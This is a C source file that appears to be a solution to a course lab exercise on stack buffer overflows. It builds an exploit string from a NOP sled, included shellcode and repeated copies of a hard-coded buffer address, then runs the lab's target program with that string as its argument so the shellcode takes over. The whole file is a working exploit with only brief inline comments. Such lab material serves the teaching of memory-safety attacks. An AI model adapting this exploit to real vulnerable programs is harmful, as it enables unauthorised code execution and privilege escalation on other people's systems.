#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

static const int addr = 0x2021fe10;	// buf's starting address in target1
static const int NOP = 0x90;

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	
	char buf[125];

	memset((void *)buf, NOP, 56);	// set initial bytes to NOP code

	int i;
	int *addr_ptr = (int *)buf;

	// Place copies of address right after shellcode
	for (i = 14; i < 32; i++) *(addr_ptr + i) = (int)addr;
	for (i = 8; i < (8 + strlen(shellcode)); i++) buf[i] = shellcode[i-8];
	buf[124] = '\0';	// terminate string with NULL

	args[0] = TARGET;
	args[1] = (char *)buf;	
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
